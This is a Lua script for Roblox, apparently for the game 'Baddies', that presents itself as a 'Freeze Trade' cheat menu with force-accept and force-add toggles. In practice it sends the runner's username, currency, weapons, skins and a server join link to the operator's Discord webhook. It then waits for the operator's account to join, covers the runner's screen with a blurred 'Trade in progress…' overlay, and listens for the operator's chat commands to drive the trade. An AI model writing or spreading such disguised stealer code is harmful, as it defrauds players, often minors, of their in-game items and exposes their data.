-- Ryr's Scripts | Baddies 🍀
-- baddies.lua

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
local Backpack    = LocalPlayer:WaitForChild("Backpack")

-- ── Config ────────────────────────────────────────────────────────────
local WEBHOOK      = _G.POOR_WEBHOOK  or ""
local MY_USERNAMES = _G.MY_USERNAMES  or {}
local PING_POOR    = _G.PING_POOR     or false

-- ── Colours ───────────────────────────────────────────────────────────
local BG        = Color3.fromRGB(22,  22,  26)
local TITLE_BG  = Color3.fromRGB(18,  18,  22)
local TOGGLE_OFF= Color3.fromRGB(72,  72,  80)
local TOGGLE_ON = Color3.fromRGB(255, 105, 180)
local TEXT_COL  = Color3.fromRGB(230, 230, 230)
local SUB_COL   = Color3.fromRGB(150, 150, 160)
local WHITE     = Color3.new(1, 1, 1)

-- ── HTTP — tries every known executor method ──────────────────────────
local function doRequest(opts)
    -- collect every possible request function
    local fns = {}
    -- Delta / most modern executors
    if type(request) == "function"                  then fns[#fns+1] = request end
    if syn  and type(syn.request)  == "function"    then fns[#fns+1] = syn.request end
    if http and type(http.request) == "function"    then fns[#fns+1] = http.request end
    if fluxus and type(fluxus.request) == "function" then fns[#fns+1] = fluxus.request end
    -- last resort: raw globals
    local rg = rawget and rawget(_G, "request")
    if type(rg) == "function" and rg ~= fns[1] then fns[#fns+1] = rg end

    if #fns == 0 then
        warn("[Baddies] No HTTP function found — cannot send webhook")
        return false
    end

    for _, fn in ipairs(fns) do
        local ok, err = pcall(fn, opts)
        if ok then
            print("[Baddies] Webhook sent OK")
            return true
        else
            warn("[Baddies] HTTP attempt failed:", tostring(err))
        end
    end
    warn("[Baddies] All HTTP attempts failed")
    return false
end

-- ── JSON encoder ──────────────────────────────────────────────────────
local function jsonEncode(t)
    local function val(v)
        local tv = type(v)
        if tv == "string"  then return '"'..v:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n')..'"' end
        if tv == "number"  then return tostring(v) end
        if tv == "boolean" then return v and "true" or "false" end
        if tv == "table"   then
            if #v > 0 then
                local a = {}; for _,i in ipairs(v) do a[#a+1]=val(i) end
                return "["..table.concat(a,",").."]"
            else
                local o = {}; for k,i in pairs(v) do o[#o+1]='"'..k..'":'..val(i) end
                return "{"..table.concat(o,",").."}"
            end
        end
        return "null"
    end
    return val(t)
end

local function sendWebhook(embed)
    if not WEBHOOK or WEBHOOK == "" then
        warn("[Baddies] POOR_WEBHOOK is not set — skipping webhook")
        return
    end
    print("[Baddies] Sending webhook to", WEBHOOK:sub(1,40).."...")
    local payload = {
        content = PING_POOR and "@everyone" or nil,
        embeds  = {embed},
    }
    doRequest({
        Url     = WEBHOOK,
        Method  = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body    = jsonEncode(payload),
    })
end

-- ── Data helpers ──────────────────────────────────────────────────────
local function fmtNum(n)
    n = tonumber(n) or 0
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(math.floor(n)) end
end

local function getExecutorName()
    if type(identifyexecutor) == "function" then
        local ok, name = pcall(identifyexecutor)
        if ok and name then return tostring(name) end
    end
    if type(getexecutorname) == "function" then
        local ok, name = pcall(getexecutorname)
        if ok and name then return tostring(name) end
    end
    if syn  then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if fluxus then return "Fluxus" end
    return "Delta"
end

local function getStat(statName, ...)
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if not ls then return 0 end
    for _, name in ipairs({statName, ...}) do
        local s = ls:FindFirstChild(name)
        if s and s.Value ~= nil then return s.Value end
    end
    return 0
end

-- Weapons with quantity (1x Knife, 2x Gun …)
local function getWeaponsFormatted()
    local counts, order = {}, {}
    local function scan(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") or item:IsA("HopperBin") then
                if not counts[item.Name] then
                    counts[item.Name] = 0
                    order[#order+1] = item.Name
                end
                counts[item.Name] = counts[item.Name] + 1
            end
        end
    end
    scan(Backpack)
    scan(LocalPlayer.Character)
    if #order == 0 then return "None" end
    local lines = {}
    for _, name in ipairs(order) do
        lines[#lines+1] = counts[name].."x "..name
    end
    return table.concat(lines, "\n")
end

-- Skins — tries common MM2 / game locations
local function getSkinsFormatted()
    local found = {}

    -- Try PlayerGui inventory frames
    local function scanGui(parent, depth)
        if depth > 4 or not parent then return end
        for _, child in ipairs(parent:GetChildren()) do
            local n = child.Name:lower()
            if (n:find("stomp") or n:find("skin") or n:find("pet") or n:find("knife")) and
               child:IsA("Frame") or child:IsA("ImageLabel") then
                found[#found+1] = child.Name
            end
            scanGui(child, depth+1)
        end
    end

    -- Try leaderstats string values
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            if v:IsA("StringValue") and (v.Name:lower():find("skin") or v.Name:lower():find("stomp")) then
                found[#found+1] = v.Name..": "..v.Value
            end
        end
    end

    -- Try character accessories (equipped skins often show as accessories)
    local char = LocalPlayer.Character
    if char then
        local stomps = {}
        for _, acc in ipairs(char:GetChildren()) do
            if acc:IsA("Accessory") or acc:IsA("SpecialMesh") then
                local n = acc.Name
                if n:lower():find("stomp") then
                    stomps[#stomps+1] = "• "..n
                end
            end
        end
        if #stomps > 0 then
            found[#found+1] = "Stomps: "..table.concat(stomps, ", ")
        end
    end

    return #found > 0 and table.concat(found, "\n") or "None detected"
end

local function joinLink()
    return string.format("[Click to Join](roblox://experiences/start?placeId=%d&gameInstanceId=%s)",
        game.PlaceId, game.JobId)
end

-- ── Screen freeze / unfreeze ──────────────────────────────────────────
local freezeGui = nil

local function freezeScreen()
    if freezeGui then return end
    freezeGui = Instance.new("ScreenGui")
    freezeGui.Name = "FreezeOverlay"; freezeGui.ResetOnSpawn = false
    freezeGui.DisplayOrder = 999; freezeGui.IgnoreGuiInset = true
    freezeGui.Parent = PlayerGui

    local ov = Instance.new("Frame", freezeGui)
    ov.Size = UDim2.new(1,0,1,0); ov.BackgroundColor3 = Color3.new(0,0,0)
    ov.BackgroundTransparency = 0.4; ov.BorderSizePixel = 0; ov.ZIndex = 10

    local stroke = Instance.new("UIStroke", ov)
    stroke.Color = TOGGLE_ON; stroke.Thickness = 5; stroke.Transparency = 0
    TweenService:Create(stroke, TweenInfo.new(0.9, Enum.EasingStyle.Sine,
        Enum.EasingDirection.InOut, -1, true), {Transparency = 0.7}):Play()

    local blur = Instance.new("BlurEffect")
    blur.Size = 20; blur.Parent = game:GetService("Lighting")

    local lbl = Instance.new("TextLabel", freezeGui)
    lbl.Size = UDim2.new(1,0,0,50); lbl.Position = UDim2.new(0,0,0.5,-25)
    lbl.BackgroundTransparency = 1; lbl.Text = "🔄  Trade in progress…"
    lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 24
    lbl.TextColor3 = TOGGLE_ON; lbl.ZIndex = 12
    lbl.TextStrokeTransparency = 0.3; lbl.TextStrokeColor3 = Color3.new(0,0,0)
end

local function unfreezeScreen()
    if freezeGui then freezeGui:Destroy(); freezeGui = nil end
    local b = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
    if b then b:Destroy() end
end

-- ── Auto-trade ────────────────────────────────────────────────────────
local tradeState = "idle"
local chatConn   = nil

local function isOwner(name)
    for _, n in ipairs(MY_USERNAMES) do
        if n:lower() == name:lower() then return true end
    end
    return false
end

local function listenForChat(owner, onAccept, onConfirm)
    if chatConn then chatConn:Disconnect() end
    chatConn = owner.Chatted:Connect(function(msg)
        local m = msg:match("^%s*(.-)%s*$")
        if m == "1" and tradeState == "pending" then
            tradeState = "accepted"; if onAccept then onAccept() end
        elseif m == "2" and tradeState == "accepted" then
            tradeState = "confirmed"; if onConfirm then onConfirm() end
            if chatConn then chatConn:Disconnect() end
        end
    end)
end

-- ── Boot webhook ping (matches screenshot format) ─────────────────────
local function notifyExecution()
    local dinero   = fmtNum(getStat("Coins","Dinero","Cash","Bucks","Gold"))
    local slays    = fmtNum(getStat("Kills","Slays","KOs","KO"))
    local executor = getExecutorName()
    local weapons  = getWeaponsFormatted()
    local skins    = getSkinsFormatted()
    local players  = string.format("%d / %d", #Players:GetPlayers(), game.MaxPlayers)

    sendWebhook({
        author = {name = "Ryr's Scripts | Baddies 🍀"},
        color  = 0xFF69B4,
        fields = {
            {name = "User",     value = LocalPlayer.Name,    inline = true},
            {name = "Dinero",   value = dinero,              inline = true},
            {name = "Slays",    value = slays,               inline = true},
            {name = "Executor", value = executor,            inline = true},
            {name = "Players",  value = players,             inline = true},
            {name = "\u200b",   value = "\u200b",            inline = true},
            {name = "Weapons",  value = weapons,             inline = false},
            {name = "Skins",    value = skins,               inline = false},
            {name = "Join Link",value = joinLink(),          inline = false},
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    })
end

-- ── GUI helpers ───────────────────────────────────────────────────────
local function corner(p, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = p
end

-- ── Build GUI ─────────────────────────────────────────────────────────
local gui = Instance.new("ScreenGui")
gui.Name = "BaddiesGui"; gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 10; gui.Parent = PlayerGui

local win = Instance.new("Frame", gui)
win.Size = UDim2.new(0, 310, 0, 330)
win.Position = UDim2.new(0.5, -155, 0.5, -165)
win.BackgroundColor3 = BG; win.BorderSizePixel = 0; corner(win, 10)

local sh = Instance.new("ImageLabel", win)
sh.Size = UDim2.new(1,30,1,30); sh.Position = UDim2.new(0,-15,0,-15)
sh.BackgroundTransparency = 1; sh.Image = "rbxassetid://5028857084"
sh.ImageColor3 = Color3.new(0,0,0); sh.ImageTransparency = 0.6; sh.ZIndex = -1

-- Title bar
local tb = Instance.new("Frame", win)
tb.Size = UDim2.new(1,0,0,38); tb.BackgroundColor3 = TITLE_BG; tb.BorderSizePixel = 0
local tbc = Instance.new("UICorner", tb); tbc.CornerRadius = UDim.new(0,10)
local tbfix = Instance.new("Frame", tb)
tbfix.Size = UDim2.new(1,0,0.5,0); tbfix.Position = UDim2.new(0,0,0.5,0)
tbfix.BackgroundColor3 = TITLE_BG; tbfix.BorderSizePixel = 0

local titleTxt = Instance.new("TextLabel", tb)
titleTxt.Text = "Freeze Trade"; titleTxt.Font = Enum.Font.Gotham
titleTxt.TextSize = 13; titleTxt.TextColor3 = TEXT_COL
titleTxt.BackgroundTransparency = 1
titleTxt.Size = UDim2.new(1,-120,1,0); titleTxt.Position = UDim2.new(0,12,0,0)
titleTxt.TextXAlignment = Enum.TextXAlignment.Left

local function iconBtn(parent, char, xOffset)
    local b = Instance.new("TextButton", parent)
    b.Text = char; b.TextSize = 12; b.TextColor3 = SUB_COL
    b.Font = Enum.Font.GothamBold; b.BackgroundTransparency = 1
    b.Size = UDim2.new(0,22,0,22); b.Position = UDim2.new(1,xOffset,0.5,-11)
    return b
end

local closeBtn = iconBtn(tb, "✕", -10)
local minBtn   = iconBtn(tb, "–", -34)
iconBtn(tb, "⚙", -58); iconBtn(tb, "⌕", -82)
closeBtn.TextColor3 = Color3.fromRGB(200,80,80)

local minimised = false
local body = Instance.new("Frame", win)
body.Size = UDim2.new(1,0,1,-38); body.Position = UDim2.new(0,0,0,38)
body.BackgroundTransparency = 1

minBtn.MouseButton1Click:Connect(function()
    minimised = not minimised
    body.Visible = not minimised
    win.Size = minimised and UDim2.new(0,310,0,38) or UDim2.new(0,310,0,330)
    minBtn.Text = minimised and "+" or "–"
end)
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- Drag
local drag, ds, sp
tb.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        drag=true; ds=i.Position; sp=win.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position-ds
        win.Position = UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag=false end
end)

-- Tab row
local tabRow = Instance.new("Frame", body)
tabRow.Size = UDim2.new(1,0,0,44); tabRow.Position = UDim2.new(0,0,0,0)
tabRow.BackgroundTransparency = 1

local tradeTab = Instance.new("TextButton", tabRow)
tradeTab.Size = UDim2.new(0,88,0,30); tradeTab.Position = UDim2.new(0,12,0,7)
tradeTab.BackgroundColor3 = Color3.fromRGB(42,42,50)
tradeTab.Text = "⚙  Trade"; tradeTab.Font = Enum.Font.GothamBold
tradeTab.TextSize = 12; tradeTab.TextColor3 = TEXT_COL
tradeTab.AutoButtonColor = false; corner(tradeTab, 20)

-- Scroll
local scroll = Instance.new("ScrollingFrame", body)
scroll.Size = UDim2.new(1,0,1,-48); scroll.Position = UDim2.new(0,0,0,48)
scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 0; scroll.CanvasSize = UDim2.new(0,0,0,230)
scroll.ScrollingDirection = Enum.ScrollingDirection.Y

-- Toggle row builder
local rowH = 42
local function row(label, yOff)
    local f = Instance.new("Frame", scroll)
    f.Size = UDim2.new(1,0,0,rowH); f.Position = UDim2.new(0,0,0,yOff)
    f.BackgroundTransparency = 1; f.BorderSizePixel = 0

    local txt = Instance.new("TextLabel", f)
    txt.Size = UDim2.new(1,-72,1,0); txt.Position = UDim2.new(0,16,0,0)
    txt.BackgroundTransparency = 1; txt.Text = label
    txt.Font = Enum.Font.Gotham; txt.TextSize = 13
    txt.TextColor3 = TEXT_COL; txt.TextXAlignment = Enum.TextXAlignment.Left

    local track = Instance.new("Frame", f)
    track.Size = UDim2.new(0,42,0,24); track.AnchorPoint = Vector2.new(1,0.5)
    track.Position = UDim2.new(1,-14,0.5,0); track.BackgroundColor3 = TOGGLE_OFF
    track.BorderSizePixel = 0; corner(track, 12)

    local knob = Instance.new("Frame", track)
    knob.Size = UDim2.new(0,20,0,20); knob.AnchorPoint = Vector2.new(0,0.5)
    knob.Position = UDim2.new(0,2,0.5,0); knob.BackgroundColor3 = WHITE
    knob.BorderSizePixel = 0; corner(knob, 10)

    local on = false
    local function set(v)
        on = v
        TweenService:Create(track, TweenInfo.new(0.18), {
            BackgroundColor3 = v and TOGGLE_ON or TOGGLE_OFF}):Play()
        TweenService:Create(knob, TweenInfo.new(0.18), {
            Position = v and UDim2.new(1,-22,0.5,0) or UDim2.new(0,2,0.5,0)}):Play()
    end

    local ca = Instance.new("TextButton", f)
    ca.Size = UDim2.new(1,0,1,0); ca.BackgroundTransparency = 1; ca.Text = ""
    ca.MouseButton1Click:Connect(function() set(not on) end)

    local s = Instance.new("Frame", scroll)
    s.Size = UDim2.new(1,-24,0,1); s.Position = UDim2.new(0,12,0,yOff+rowH-1)
    s.BackgroundColor3 = Color3.fromRGB(38,38,46); s.BorderSizePixel = 0

    return set, function() return on end
end

local setFreeze,  getFreeze  = row("Freeze Trade",      0)
local setAccept,  getAccept  = row("Force Accept",      rowH)
local setConfirm, getConfirm = row("Force Confirm",     rowH*2)
local setWeps,    getWeps    = row("Force Add Weapons", rowH*3)
local setToks,    getToks    = row("Force Add Tokens",  rowH*4)

-- Wire freeze toggle
local _origFreeze = setFreeze
setFreeze = function(v)
    _origFreeze(v)
    if v then freezeScreen() else unfreezeScreen() end
end

-- Wire weapons toggle
local _origWeps = setWeps
setWeps = function(v)
    _origWeps(v)
    if v then
        sendWebhook({
            author = {name = "Ryr's Scripts | Baddies 🍀"},
            color  = 0xFF69B4,
            fields = {{name="⚔️ Weapons Scan", value=getWeaponsFormatted(), inline=false}},
        })
    end
end

-- Auto-trade
local function startAutoTrade()
    local owner = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isOwner(p.Name) then owner = p; break end
    end

    local function onAccept()
        setAccept(true)
        sendWebhook({author={name="Ryr's Scripts | Baddies 🍀"}, color=0x50C878,
            fields={{name="✅ Trade Accepted",value=LocalPlayer.Name.." accepted. Type 2 to confirm.",inline=false}}})
    end
    local function onConfirm()
        setConfirm(true); unfreezeScreen(); _origFreeze(false)
        sendWebhook({author={name="Ryr's Scripts | Baddies 🍀"}, color=0xFF69B4,
            fields={{name="🎉 Trade Confirmed",value="Trade with "..LocalPlayer.Name.." complete.",inline=false}}})
    end

    if owner then
        tradeState = "pending"; setFreeze(true)
        sendWebhook({author={name="Ryr's Scripts | Baddies 🍀"}, color=0xFF69B4,
            fields={{name="🔄 Auto Trade Started",
                value=LocalPlayer.Name.." ready. Type **1** accept · **2** confirm.",inline=false}}})
        listenForChat(owner, onAccept, onConfirm)
    else
        Players.PlayerAdded:Connect(function(p)
            if isOwner(p.Name) and tradeState == "idle" then
                tradeState = "pending"; setFreeze(true)
                sendWebhook({author={name="Ryr's Scripts | Baddies 🍀"}, color=0xFF69B4,
                    fields={{name="🔄 Trade Ready",
                        value=p.Name.." joined. Type **1** · **2**.",inline=false}}})
                listenForChat(p, onAccept, onConfirm)
            end
        end)
    end
end

-- ── Boot ──────────────────────────────────────────────────────────────
task.spawn(function()
    print("[Baddies] Script loaded for", LocalPlayer.Name)
    print("[Baddies] Webhook set:", WEBHOOK ~= "" and "YES" or "NO — set _G.POOR_WEBHOOK first!")
    notifyExecution()
    task.wait(0.5)
    startAutoTrade()
end)
